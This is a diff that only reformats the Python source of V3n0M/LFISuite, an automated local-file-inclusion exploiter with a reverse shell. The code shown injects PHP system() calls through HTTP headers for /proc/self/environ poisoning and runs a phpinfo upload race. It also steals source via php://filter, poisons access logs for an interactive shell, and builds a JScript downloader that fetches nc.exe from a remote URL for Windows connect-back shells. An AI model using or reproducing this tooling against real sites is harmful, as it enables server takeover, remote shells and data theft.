@@ -21,13 +21,14 @@ from termcolor import colored
 
 def download(file_url, local_filename):
     web_file = urllib.request.urlopen(file_url)
-    local_file = open(local_filename, 'w')
+    local_file = open(local_filename, "w")
     local_file.write(web_file.read())
     web_file.close()
     local_file.close()
 
+
 netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
-LFS_V3n0M_VERSION = '1.1'  # DO NOT MODIFY THIS FOR ANY REASON!!
+LFS_V3n0M_VERSION = "1.1"  # DO NOT MODIFY THIS FOR ANY REASON!!
 
 # --------- Auto-Hack Global Variables ----------#
 ahactive = False
@@ -65,7 +66,10 @@ def initWindowsReverse():
 
     wget_num = generateRandom()[11:]
     nc_num = generateRandom()[11:]
-    wget_js_content = """var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("nc_%s.exe");""" % nc_num
+    wget_js_content = (
+        """var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("nc_%s.exe");"""
+        % nc_num
+    )
     wget_filename = "lfisuite_wget_%s.js" % wget_num
     nc_filename = "nc_%s" % nc_num
 
@@ -80,7 +84,12 @@ def windows_reverse_shell():
     global reverseConn
 
     if "?" in reverseConn:
-        print(colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.", "red"))
+        print(
+            colored(
+                "[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.",
+                "red",
+            )
+        )
         time.sleep(2)
         ipBack = input("\n[*] Enter the IP address to connect back to -> ")
         portBack = input("[*] Enter the port to connect to [default: 12340] -> ")
@@ -93,11 +102,18 @@ def generic_reverse_shell():
     global reverseConn
 
     if "?" in reverseConn:
-        print(colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.", "red"))
+        print(
+            colored(
+                "[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.",
+                "red",
+            )
+        )
         time.sleep(2)
         ipBack = input("\n[*] Enter the IP address to connect back to -> ")
         portBack = "notValidPort"
-        while len(portBack) > 0 and (portBack.isdigit() is False or int(portBack) > 65535):
+        while len(portBack) > 0 and (
+            portBack.isdigit() is False or int(portBack) > 65535
+        ):
             portBack = input("[*] Enter the port to connect to [default: 12340] -> ")
         if len(portBack) == 0:
             portBack = 12340
@@ -120,16 +136,19 @@ def checkIfWindows(path):
 # ----------------------------------------------------#
 
 # -------------------------------------------------------------------Generic------------------------------------------------------------#
-gen_headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
-               'Accept-Language': 'en-US;',
-               'Accept-Encoding': 'gzip, deflate',
-               'Accept': 'text/html,application/xhtml+xml,application/xml;',
-               'Connection': 'close'}
+gen_headers = {
+    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
+    "Accept-Language": "en-US;",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "text/html,application/xhtml+xml,application/xml;",
+    "Connection": "close",
+}
 
 
 # noinspection PyPep8
 def banner():
-    print("""
+    print(
+        """
 
                          .//// *,                                 ,//// *,
              .///////////*//** //            ,*. ,                ////* .                 .,, ..
@@ -144,17 +163,36 @@ def banner():
    .********, /*. .#/   .*##(/,.        ,/(###(*.     .,*****,.  ./##(/,. .,**,.           .*/(/,          
              ./#(/*.
 
-	V3n0M Version Change V0.2 """)
+	V3n0M Version Change V0.2 """
+    )
 
-    print("/*-------------------------------------------------------------------------*\\")
-    print("| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |")
-    print("|                                                                           |")
-    print("| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |")
-    print("|          data://, expect://, php://filter, access logs                    |")
-    print("|                                                                           |")
-    print("| Python 3.6 V3n0M Intergration by NovaCygni, In Collaboration with...      |")
-    print("| Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |")
-    print("\*-------------------------------------------------------------------------*/\n")
+    print(
+        "/*-------------------------------------------------------------------------*\\"
+    )
+    print(
+        "| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |"
+    )
+    print(
+        "|                                                                           |"
+    )
+    print(
+        "| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |"
+    )
+    print(
+        "|          data://, expect://, php://filter, access logs                    |"
+    )
+    print(
+        "|                                                                           |"
+    )
+    print(
+        "| Python 3.6 V3n0M Intergration by NovaCygni, In Collaboration with...      |"
+    )
+    print(
+        "| Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |"
+    )
+    print(
+        "\*-------------------------------------------------------------------------*/\n"
+    )
 
 
 def check_for_update():
@@ -167,11 +205,11 @@ def check_for_update():
     try:
         lfisuite_content = requests.get(lfisuite_github_url, headers=gen_headers).text
         currversion_index = SubstrFind(lfisuite_content, keyword)[0]
-        lfisuite_content = lfisuite_content[(currversion_index + len(keyword)):]
+        lfisuite_content = lfisuite_content[(currversion_index + len(keyword)) :]
 
         currversion = ""
         for c in lfisuite_content:
-            if c == '\'':
+            if c == "'":
                 break
             currversion = "%s%s" % (currversion, c)
 
@@ -209,7 +247,7 @@ def printChoice(choice):
 
 def extractWebsiteFromUrl(url):
     # Pre: url contains http:// or https:// declaration
-    splits = url.split('/')
+    splits = url.split("/")
     return "%s//%s" % (splits[0], splits[2])
 
 
@@ -220,7 +258,7 @@ def getHTTPWebsite(ourl):  # http://127.0.0.1/dvwa/test.php --> http://127.0.0.1
 
 def removeHttpFromWebsite(website):
     if "http://" in website or "https://" in website:
-        splits = website.split('/')
+        splits = website.split("/")
         return splits[2]
     return website
 
@@ -272,7 +310,7 @@ def extractPathFromPaths():
     tmp = ""
 
     for c in nfirst:
-        if c != '.' and c != "/":
+        if c != "." and c != "/":
             break
         tmp += c
 
@@ -284,17 +322,19 @@ def extractPathFromPaths():
 
 def cutURLToLastEqual(url):
     indexes = SubstrFind(url, "=")
-    return url[0:indexes[len(indexes) - 1] + 1]
+    return url[0 : indexes[len(indexes) - 1] + 1]
 
 
 def extractPathFromUrl(url):
     # Pre: url contains http:// or https:// declaration
     slashes = SubstrFind(url, "/")
-    return url[(slashes[2]):]
+    return url[(slashes[2]) :]
 
 
-def correctUrl(url):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='
-    if url[len(url) - 1] == '=':
+def correctUrl(
+    url,
+):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='
+    if url[len(url) - 1] == "=":
         return url
     eq = SubstrFind(url, "=")
     if len(eq) == 0:
@@ -302,19 +342,21 @@ def correctUrl(url):  # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'htt
         sys.exit()
     last = eq[len(eq) - 1]
 
-    return url[:(last + 1)]
+    return url[: (last + 1)]
 
 
 def checkFilename(filename):  # useful in case of drag and drop
     while True:
-        if filename[0] == '\'':
+        if filename[0] == "'":
             filename = filename[1:]
-        if filename[len(filename) - 1] == '\'':
+        if filename[len(filename) - 1] == "'":
             filename = filename[:-1]
         if os.path.exists(filename):
             return filename
         filename = input(
-            "[!] Cannot find '%s'.\n[*] Enter a valid name of the file containing the paths to test -> " % filename)
+            "[!] Cannot find '%s'.\n[*] Enter a valid name of the file containing the paths to test -> "
+            % filename
+        )
 
 
 def showInterestingPath(toPrint, stack):
@@ -331,9 +373,12 @@ def generateRandom():
 
 
 def onlyPhpPrint():
-    print(colored(
-        "[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n",
-        "red"))
+    print(
+        colored(
+            "[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n",
+            "red",
+        )
+    )
 
 
 def invalidChoice():
@@ -351,9 +396,24 @@ se_par = ""
 se_stopStr = ""
 se_header_par = ""
 se_phponly = False
-se_header_pars = ["HTTP_USER_AGENT", "HTTP_ACCEPT", "HTTP_ACCEPT_ENCODING", "HTTP_ACCEPT_LANGUAGE", "HTTP_REFERER",
-                  "HTTP_CONNECTION", "HTTP_COOKIE"]
-se_header_conv = ["User-Agent", "Accept", "Accept-Encoding", "Accept-Language", "Referer", "Connection", "Cookie"]
+se_header_pars = [
+    "HTTP_USER_AGENT",
+    "HTTP_ACCEPT",
+    "HTTP_ACCEPT_ENCODING",
+    "HTTP_ACCEPT_LANGUAGE",
+    "HTTP_REFERER",
+    "HTTP_CONNECTION",
+    "HTTP_COOKIE",
+]
+se_header_conv = [
+    "User-Agent",
+    "Accept",
+    "Accept-Encoding",
+    "Accept-Language",
+    "Referer",
+    "Connection",
+    "Cookie",
+]
 se_headers = gen_headers
 
 
@@ -378,13 +438,16 @@ def printSwitchUA():
 def setHttpCookie():
     global se_headers
 
-    print("\n[Warning] In order to get the program working you need to provide a value for HTTP_COOKIE parameter.")
     print(
-        "Why? Before injecting I perform a quick test to figure out how the web response is structured and how parameters are shown.")
+        "\n[Warning] In order to get the program working you need to provide a value for HTTP_COOKIE parameter."
+    )
+    print(
+        "Why? Before injecting I perform a quick test to figure out how the web response is structured and how parameters are shown."
+    )
     cookie_val = input("\nHTTP_COOKIE (default: 'nope') -> ")
     if len(cookie_val) == 0:
         cookie_val = "nope"
-    se_headers['Cookie'] = cookie_val
+    se_headers["Cookie"] = cookie_val
 
 
 def chooseSe_Par():
@@ -420,7 +483,9 @@ def chooseSe_Par():
 
 
 def cleanOutput(output, newline):
-    output = output.replace("\r", "").replace("%c" % chr(0), "").replace("\t", "")  # chr(0)=NUL
+    output = (
+        output.replace("\r", "").replace("%c" % chr(0), "").replace("\t", "")
+    )  # chr(0)=NUL
     if newline:
         output = output.replace("\n", "")
 
@@ -432,11 +497,11 @@ def execSeCmd(cmd):
     global se_headers
 
     if se_phponly is False:
-        se_headers['%s' % se_header_par] = '<?php system("%s"); ?>' % cmd
+        se_headers["%s" % se_header_par] = '<?php system("%s"); ?>' % cmd
     else:
         if ";" not in cmd[-2:]:
             cmd = "%s;" % cmd
-        se_headers['%s' % se_header_par] = '<?php %s ?>' % cmd
+        se_headers["%s" % se_header_par] = "<?php %s ?>" % cmd
         # print "se_headers = %s\n---------" %se_headers # useful for debugging
     if cmd != reverseConn:
         r = requests.get(se_url, headers=se_headers, timeout=15)
@@ -444,13 +509,13 @@ def execSeCmd(cmd):
         r = requests.get(se_url, headers=se_headers)
     resp = r.text
 
-    '''print "\nse_headers:\n%s\n\n" %se_headers
-    print "\n\n-------------\n%s\n-------------\n\n" %resp'''
+    """print "\nse_headers:\n%s\n\n" %se_headers
+    print "\n\n-------------\n%s\n-------------\n\n" %resp"""
     index_start = SubstrFind(resp, "%s=" % se_par)
     index_stop = SubstrFind(resp, se_stopStr)
 
     try:
-        return resp[(index_start[0] + len(se_par) + 1):index_stop[0]]
+        return resp[(index_start[0] + len(se_par) + 1) : index_stop[0]]
     except:
         return "<NOT WORKING>"
 
@@ -479,7 +544,9 @@ def correctString(s):
 def se_fail(par):
     print("\n[-] LFI did not work over the parameter '%s'." % se_par)
     if par == "None":
-        print("[ADVICE] Run the Auto-Hack module to see if the other parameters are vulnerable (it happens!) :-)\n")
+        print(
+            "[ADVICE] Run the Auto-Hack module to see if the other parameters are vulnerable (it happens!) :-)\n"
+        )
 
 
 def hackSE(par):
@@ -499,7 +566,7 @@ def hackSE(par):
 
     if "%s=" % se_par in resp:
         stop = ""
-        fields = resp.split('=')
+        fields = resp.split("=")
         for x in range(0, len(fields)):
             if se_par in fields[x]:
                 if x + 1 < len(fields):
@@ -508,12 +575,15 @@ def hackSE(par):
 
         if len(stop) > 0:
             for i in reversed(stop):
-                if i.isupper() is False and i != '_':
+                if i.isupper() is False and i != "_":
                     break
                 se_stopStr += i
             se_stopStr = "%s=" % (se_stopStr[::-1])
     else:
-        print("\n[!] Unfortunately the parameter '%s' is not contained in the web response.\n" % se_par)
+        print(
+            "\n[!] Unfortunately the parameter '%s' is not contained in the web response.\n"
+            % se_par
+        )
         if par != "None":
             return
         sys.exit(0)
@@ -546,12 +616,20 @@ def hackSE(par):
             se_phponly = True
             rand_str = generateRandom()
             output = execSeCmd("echo %s;" % rand_str)
-            if (rand_str in output and ("echo %s" % rand_str) not in output and (
-                        "echo%%20%s" % rand_str) not in output):
+            if (
+                rand_str in output
+                and ("echo %s" % rand_str) not in output
+                and ("echo%%20%s" % rand_str) not in output
+            ):
                 print(colored("\n[+] LFI Worked! :-)", "red"))
                 print(colored("[*] Opening a shell...", "white"))
                 onlyPhpPrint()
-                print(colored("[WARNING] All occurences of \" will be replaced with '.\n", "white"))
+                print(
+                    colored(
+                        "[WARNING] All occurences of \" will be replaced with '.\n",
+                        "white",
+                    )
+                )
                 cmd = ""
                 whoami = isUnknown(execSeCmd("get_current_user();"))
                 pwd = isUnknown(execSeCmd("getcwd();"))
@@ -559,13 +637,15 @@ def hackSE(par):
 
                 while cmd != "exit" and cmd != "quit":
                     cmd = input("%s@%s:%s$ PHP:// " % (whoami, shell_host, pwd))
-                    cmd = cmd.replace('"', '\'')
+                    cmd = cmd.replace('"', "'")
                     if cmd != "exit" and cmd != "quit":
                         got = cleanOutput(execSeCmd(correctString(cmd)), False)
                         if "<NOT WORKING>" not in got:
                             print(got)
                 if ahactive:
-                    cont = input("\n[*] Do you want to try even the other attacks? (y/n) ")
+                    cont = input(
+                        "\n[*] Do you want to try even the other attacks? (y/n) "
+                    )
                     if cont == "n" or cont == "N":
                         exit()
                 else:
@@ -590,7 +670,7 @@ def run_self_environ():
         se_url = ahenvurl
 
     se_url = checkHttp(se_url)
-    se_headers['Referer'] = extractWebsiteFromUrl(se_url)
+    se_headers["Referer"] = extractWebsiteFromUrl(se_url)
     auto = chooseSe_Par()
 
     if auto is False:
@@ -634,7 +714,7 @@ def phpinfo_ext(content):
     if found:
         start = indexes[0] + 11
         for x in range(start, len(content)):
-            if content[x] == '<':
+            if content[x] == "<":
                 break
             got += content[x]
 
@@ -646,28 +726,30 @@ def phpinfo_request(headers, cmd, path1, path, test, host):
     bigz = 3000
     junkheaders = 30
     junkfiles = 40
-    junkfilename = '>' * 100000
+    junkfilename = ">" * 100000
     z = "Z" * bigz
     found = 0
 
     phpinfo_headers = {
-        'User-Agent': 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8',
-        'Accept-Language': 'en-us,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
-        'z': z,
-        'Connection': 'close'}
+        "User-Agent": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8",
+        "Accept-Language": "en-us,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Charset": "windows-1251,utf-8;q=0.7,*;q=0.7",
+        "z": z,
+        "Connection": "close",
+    }
 
     if "Cookie" in gen_headers:
-        phpinfo_headers['Cookie'] = gen_headers['Cookie']
+        phpinfo_headers["Cookie"] = gen_headers["Cookie"]
 
     loop = list(range(0, junkheaders))
     for count in loop:
-        phpinfo_headers['z%s' % count] = count
+        phpinfo_headers["z%s" % count] = count
 
     phpinfo_headers[
-        'Content-Type'] = 'multipart/form-data; boundary=---------------------------59502863519624080131137623865'
+        "Content-Type"
+    ] = "multipart/form-data; boundary=---------------------------59502863519624080131137623865"
 
     if "php://" in cmd:
         cmd = cmd[6:]
@@ -676,15 +758,20 @@ def phpinfo_request(headers, cmd, path1, path, test, host):
     if ";" not in cmd[-2:]:
         cmd = "%s;" % cmd
 
-    content = """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="tfile"; filename="test.html"\nContent-Type: text/html\n\nAbracadabrA <?php %s ?>\n-----------------------------59502863519624080131137623865--""" % (
-        cmd)
+    content = (
+        """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="tfile"; filename="test.html"\nContent-Type: text/html\n\nAbracadabrA <?php %s ?>\n-----------------------------59502863519624080131137623865--"""
+        % (cmd)
+    )
     loop = list(range(0, junkfiles))
 
     for count in loop:
-        content = content + """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\nContent-Type: text/html\n\nno\n-----------------------------59502863519624080131137623865--\n""" % (
-            count, count, junkfilename)
+        content = (
+            content
+            + """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\nContent-Type: text/html\n\nno\n-----------------------------59502863519624080131137623865--\n"""
+            % (count, count, junkfilename)
+        )
 
-    phpinfo_headers['Content-Length'] = '%s' % (len(content))
+    phpinfo_headers["Content-Length"] = "%s" % (len(content))
     got = ""
     url = "%s%s" % (host, path)
 
@@ -692,7 +779,9 @@ def phpinfo_request(headers, cmd, path1, path, test, host):
         if phpinfo_reverse:
             r = requests.post(url=url, headers=phpinfo_headers, data=content)
         else:
-            r = requests.post(url=url, headers=phpinfo_headers, data=content, timeout=20)
+            r = requests.post(
+                url=url, headers=phpinfo_headers, data=content, timeout=20
+            )
     except:
         return got
 
@@ -700,7 +789,7 @@ def phpinfo_request(headers, cmd, path1, path, test, host):
     if "tmp_name" in resp:
         found = 1
         tmp_name = []
-        lines = resp.split('\n')
+        lines = resp.split("\n")
         for line in lines:
             if "tmp_name]" in line:
                 mystr = str(line)
@@ -723,8 +812,12 @@ def run_phpinfo():
     global victimOs
 
     if ahactive is False:
-        host = input("[*] Enter the website without path (ex: 'http://justsitename') -> ")
-        lfipath = input("[*] Enter the vulnerable LFI path (ex: '/lfi.php?file=../..') -> ")
+        host = input(
+            "[*] Enter the website without path (ex: 'http://justsitename') -> "
+        )
+        lfipath = input(
+            "[*] Enter the vulnerable LFI path (ex: '/lfi.php?file=../..') -> "
+        )
     else:
         host = ahwebsite
         lfipath = ahpath
@@ -741,22 +834,40 @@ def run_phpinfo():
     found = phpinfo_request(headers, cmd, lfipath, phpinfopath, 1, host)
 
     if len(found) > 0 and rand_str in found:
-        print(colored("\n[+] The website seems to be vulnerable. Opening a system Shell..", "white"))
+        print(
+            colored(
+                "\n[+] The website seems to be vulnerable. Opening a system Shell..",
+                "white",
+            )
+        )
         time.sleep(0.5)
-        print(colored(
-            "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
-            "red"))
+        print(
+            colored(
+                "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
+                "red",
+            )
+        )
 
         whoami = isUnknown(
-            cleanOutput(phpinfo_request(headers, "whoami", lfipath, phpinfopath, 0, host), True).replace(" ", ""))
+            cleanOutput(
+                phpinfo_request(headers, "whoami", lfipath, phpinfopath, 0, host), True
+            ).replace(" ", "")
+        )
         pwd = isUnknown(
-            cleanOutput(phpinfo_request(headers, "pwd", lfipath, phpinfopath, 0, host), True).replace(" ", ""))
+            cleanOutput(
+                phpinfo_request(headers, "pwd", lfipath, phpinfopath, 0, host), True
+            ).replace(" ", "")
+        )
 
         if pwd == "?":
-            path = cleanOutput(phpinfo_request(headers, "path", lfipath, phpinfopath, 0, host), True).replace(" ", "")
+            path = cleanOutput(
+                phpinfo_request(headers, "path", lfipath, phpinfopath, 0, host), True
+            ).replace(" ", "")
             if checkIfWindows(path):
                 victimOs = "Windows"
-                pwd = cleanOutput(phpinfo_request(headers, "cd", lfipath, phpinfopath, 0, host), True).replace(" ", "")
+                pwd = cleanOutput(
+                    phpinfo_request(headers, "cd", lfipath, phpinfopath, 0, host), True
+                ).replace(" ", "")
 
         shell_host = removeHttpFromWebsite(host)
 
@@ -766,7 +877,9 @@ def run_phpinfo():
                 if checkIfReverseShell(cmd):
                     phpinfo_reverse = True
                     if victimOs == "Windows":
-                        windows_phpinfo_reverse_shell(headers, lfipath, phpinfopath, host)
+                        windows_phpinfo_reverse_shell(
+                            headers, lfipath, phpinfopath, host
+                        )
                     else:
                         phpinfo_reverse_shell(headers, lfipath, phpinfopath, host)
                 else:
@@ -777,24 +890,50 @@ def run_phpinfo():
         shell_host = ""
         pwd = ""
         rand_str = generateRandom()
-        found = phpinfo_request(headers, "php://echo %s" % rand_str, lfipath, phpinfopath, 1, host)
+        found = phpinfo_request(
+            headers, "php://echo %s" % rand_str, lfipath, phpinfopath, 1, host
+        )
         if rand_str in found:
-            print(colored("\n[+] The website seems to be vulnerable. Opening a Shell..", "white"))
+            print(
+                colored(
+                    "\n[+] The website seems to be vulnerable. Opening a Shell..",
+                    "white",
+                )
+            )
             time.sleep(0.5)
             onlyPhpPrint()
 
             whoami = isUnknown(
-                cleanOutput(phpinfo_request(headers, "php://get_current_user()", lfipath, phpinfopath, 0, host),
-                            True).replace(" ", ""))
+                cleanOutput(
+                    phpinfo_request(
+                        headers,
+                        "php://get_current_user()",
+                        lfipath,
+                        phpinfopath,
+                        0,
+                        host,
+                    ),
+                    True,
+                ).replace(" ", "")
+            )
             pwd = isUnknown(
-                cleanOutput(phpinfo_request(headers, "php://getcwd()", lfipath, phpinfopath, 0, host), True).replace(
-                    " ", ""))
+                cleanOutput(
+                    phpinfo_request(
+                        headers, "php://getcwd()", lfipath, phpinfopath, 0, host
+                    ),
+                    True,
+                ).replace(" ", "")
+            )
             shell_host = removeHttpFromWebsite(host)
 
         while cmd != "exit" and cmd != "quit":
             cmd = input("%s@%s:%s$ PHP:// " % (whoami, shell_host, pwd))
             if cmd != "exit" and cmd != "quit":
-                print(phpinfo_request(headers, "php://" + cmd, lfipath, phpinfopath, 0, host))
+                print(
+                    phpinfo_request(
+                        headers, "php://" + cmd, lfipath, phpinfopath, 0, host
+                    )
+                )
         exit()
 
 
@@ -803,7 +942,14 @@ def run_phpinfo():
 # ---------------------------------------------------------------PHP://Filter-------------------------------------------------------------#
 def base64_check(c):
     t = ord(c)
-    if (65 <= t <= 90) or (97 <= t <= 122) or (48 <= t <= 57) or (t == 43) or (t == 47) or (t == 61):
+    if (
+        (65 <= t <= 90)
+        or (97 <= t <= 122)
+        or (48 <= t <= 57)
+        or (t == 43)
+        or (t == 47)
+        or (t == 61)
+    ):
         return True
     return False
 
@@ -812,7 +958,7 @@ def phpfilter_extract(content):
     ftemp = ""
     found = []
 
-    lines = content.split('\n')
+    lines = content.split("\n")
     for line in lines:
         ftemp = ""
         length = len(line)
@@ -821,7 +967,11 @@ def phpfilter_extract(content):
             if base64_check(line[x]):
                 ftemp += line[x]
             else:
-                if length > 100 and base64_check(line[x]) is False and len(ftemp) >= int((length / 2)):
+                if (
+                    length > 100
+                    and base64_check(line[x]) is False
+                    and len(ftemp) >= int((length / 2))
+                ):
                     break
                 ftemp = ""
 
@@ -848,7 +998,9 @@ def run_phpfilter():
     global ahurl
 
     if ahactive is False:
-        ofilterurl = input("[*] Enter the php://filter vulnerable url (ex: 'http://site/index.php?page=') -> ")
+        ofilterurl = input(
+            "[*] Enter the php://filter vulnerable url (ex: 'http://site/index.php?page=') -> "
+        )
     else:
         ofilterurl = ahurl
 
@@ -857,10 +1009,15 @@ def run_phpfilter():
 
     filterpage = "1"
     while True:
-        filterpage = input("[*] Enter the page you want to steal information of ['0' to exit] -> ")
+        filterpage = input(
+            "[*] Enter the page you want to steal information of ['0' to exit] -> "
+        )
         if filterpage == "0":
             break
-        filterurl = "%sphp://filter/convert.base64-encode/resource=%s" % (ofilterurl, filterpage)
+        filterurl = "%sphp://filter/convert.base64-encode/resource=%s" % (
+            ofilterurl,
+            filterpage,
+        )
         r = requests.get(filterurl, headers=gen_headers, timeout=15)
         filtercontent = r.text
 
@@ -869,22 +1026,28 @@ def run_phpfilter():
         if len(found) == 0:
             print("[-] Any interesting Base64 code found :(")
         else:
-            see = input("[+] Found possible interesting Base64 code. Do you want me to show it? (y/n) ")
+            see = input(
+                "[+] Found possible interesting Base64 code. Do you want me to show it? (y/n) "
+            )
             if see == "y" or see == "Y" or see == "yes":
                 print(
-                    "-------------------------------------------------------------------------------------------------------------------------")
+                    "-------------------------------------------------------------------------------------------------------------------------"
+                )
                 print("%s" % found)
                 print(
-                    "-------------------------------------------------------------------------------------------------------------------------\n")
+                    "-------------------------------------------------------------------------------------------------------------------------\n"
+                )
 
             decode = input("[*] Do you want me to decode it? (y/n) ")
             if decode == "y" or decode == "Y" or decode == "yes":
                 decoded = base64.b64decode(found)
                 print(
-                    "\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n")
+                    "\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n"
+                )
                 print("%s" % decoded)
                 print(
-                    "\n-------------------------------------------------------------------------------------------------------------------------\n")
+                    "\n-------------------------------------------------------------------------------------------------------------------------\n"
+                )
 
         print("")
 
@@ -907,7 +1070,7 @@ def access_log_windows_reverse_shell(host, keyword, ologurl):
 
     windows_reverse_shell()
     send_access_log_cmd(reverseConn, host, keyword)
-    print(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), False))
+    print(cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), False))
 
 
 def access_log_reverse_shell(host, keyword, ologurl):
@@ -916,23 +1079,27 @@ def access_log_reverse_shell(host, keyword, ologurl):
     access_log_reverse = True
     generic_reverse_shell()
     send_access_log_cmd(reverseConn, host, keyword)
-    print(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), False))
+    print(cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), False))
 
 
 def access_control(resp, keyword, rand_str):
-    lines = resp.split('\n')
+    lines = resp.split("\n")
 
     if "_PHP" in keyword:  # in case system() calls have been disabled
         keyword = keyword[:-4]
 
-    if (len(SubstrFind(resp, rand_str)) > 0 and len(SubstrFind(resp, "echo %s" % rand_str)) == 0 and
-                len(SubstrFind(resp, "echo%%20%s" % rand_str)) == 0):
+    if (
+        len(SubstrFind(resp, rand_str)) > 0
+        and len(SubstrFind(resp, "echo %s" % rand_str)) == 0
+        and len(SubstrFind(resp, "echo%%20%s" % rand_str)) == 0
+    ):
         return True
 
     return False
 
 
 # ----------------------------------------------------
+
 
 def send_access_log_cmd(cmd, host, keyword):
     path = ""
@@ -971,14 +1138,14 @@ def access_log_ext(url, keyword):
     nget = len(get_indexes)
     if nget > 0:
         last = get_indexes[nget - 1]
-        toCheck = resp[(last + len(keyword)):]
+        toCheck = resp[(last + len(keyword)) :]
         stop = SubstrFind(toCheck, " HTTP/1.1")
 
         if len(stop) > 0:
-            return toCheck[1:(stop[0])]
-        stop = SubstrFind(toCheck, "\"")
+            return toCheck[1 : (stop[0])]
+        stop = SubstrFind(toCheck, '"')
         if len(stop) > 0:
-            return toCheck[1:(stop[0])]
+            return toCheck[1 : (stop[0])]
     return ""
 
 
@@ -986,7 +1153,7 @@ def access_log_while(whoami, logmain, pwd, ologurl, keyword, windows):
     cmd = ""
     while cmd != "exit" and cmd != "quit":
         cmd = input("%s@%s:%s$ " % (whoami, logmain.split("/")[2], pwd))
-        cmd = cmd.replace("'", "\"")
+        cmd = cmd.replace("'", '"')
         if cmd != "exit" and cmd != "quit":
             if checkIfReverseShell(cmd):
                 if windows is False:
@@ -995,7 +1162,7 @@ def access_log_while(whoami, logmain, pwd, ologurl, keyword, windows):
                     access_log_windows_reverse_shell(logmain, keyword, ologurl)
             else:
                 send_access_log_cmd(cmd, logmain, keyword)
-                print(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), False))
+                print(cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), False))
     exit()
 
 
@@ -1009,7 +1176,12 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
         r = requests.get(ologurl, headers=gen_headers, timeout=15)
 
     resp = r.text
-    print(colored("\nTrying to inject the website using simple %s requests." % keyword, "white"))
+    print(
+        colored(
+            "\nTrying to inject the website using simple %s requests." % keyword,
+            "white",
+        )
+    )
 
     if access_control(resp, keyword, randStr):
         print("[+] The website seems to be vulnerable. Opening a System Shell..\n")
@@ -1017,9 +1189,9 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
         cmd = ""
 
         send_access_log_cmd("whoami", logmain, keyword)
-        whoami = cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True)
+        whoami = cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
         send_access_log_cmd("pwd", logmain, keyword)
-        pwd = cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True)
+        pwd = cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
 
         access_log_while(whoami, logmain, pwd, ologurl, keyword, False)
 
@@ -1028,21 +1200,25 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
         # check if Windows operating system
         # ----------------------------------------------------- #
         send_access_log_cmd("path", logmain, keyword)
-        path = cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True)
+        path = cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
         time.sleep(1)
 
         if checkIfWindows(path):
             # trying to get current Windows user by using 'whoami' command
             send_access_log_cmd("whoami", logmain, keyword)
-            whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True))
